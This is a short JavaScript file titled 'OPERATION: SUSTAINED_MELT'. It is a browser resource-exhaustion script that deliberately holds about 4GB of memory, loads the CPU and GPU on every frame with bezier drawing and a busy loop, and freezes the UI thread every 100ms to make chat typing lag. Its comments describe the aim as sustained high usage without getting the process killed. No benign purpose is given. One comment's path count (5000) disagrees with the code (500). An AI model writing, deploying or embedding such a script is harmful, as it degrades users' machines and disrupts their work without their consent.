/** * OPERATION: SUSTAINED_MELT
 * Target: High Usage without Process Kill
 */

const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d', { alpha: false });
const ramReservoir = [];

// --- 1. THE RAM STABILIZER (Target: 90%+) ---
// Instead of infinite growth, we fill a specific number of large buffers
function saturateRAM() {
    for(let i = 0; i < 40; i++) {
        // Each buffer is ~100MB. 40 buffers = ~4GB of dedicated junk.
        const buf = new Float64Array(12500000); 
        for(let j = 0; j < buf.length; j++) buf[j] = Math.random();
        ramReservoir.push(buf);
    }
    console.log("RAM_RESERVOIR_SITUATED");
}
saturateRAM();

// --- 2. THE PATH-CRUNCHER (CPU/GPU BUS) ---
// Drawing 5000 complex paths per frame forces the CPU to calculate 
// geometry and the GPU to rasterize it.
function drawChaos(t) {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    ctx.strokeStyle = `hsl(${t/10 % 360}, 100%, 50%)`;
    ctx.lineWidth = 2;
    
    for(let i = 0; i < 500; i++) {
        ctx.beginPath();
        let x = Math.sin(t/500 + i) * 500 + canvas.width/2;
        let y = Math.cos(t/500 + i) * 500 + canvas.height/2;
        ctx.moveTo(x, y);
        
        // Complex bezier curves are the secret to CPU usage
        ctx.bezierCurveTo(
            x + Math.sin(t/100) * 200, y + Math.cos(t/100) * 200,
            x - Math.sin(t/100) * 200, y - Math.cos(t/100) * 200,
            canvas.width/2, canvas.height/2
        );
        ctx.stroke();
    }
    
    // Light "Prime Burner" to keep CPU from idling
    let dummy = 0;
    for(let j = 0; j < 1000000; j++) { dummy += Math.sqrt(j); }

    requestAnimationFrame(drawChaos);
}
requestAnimationFrame(drawChaos);

// --- 3. THE CHAT-LAGGER (UI Thread Blocker) ---
setInterval(() => {
    const start = Date.now();
    // Force a "micro-freeze" of 40ms to make typing feel like honey
    while(Date.now() - start < 40) {}
}, 100);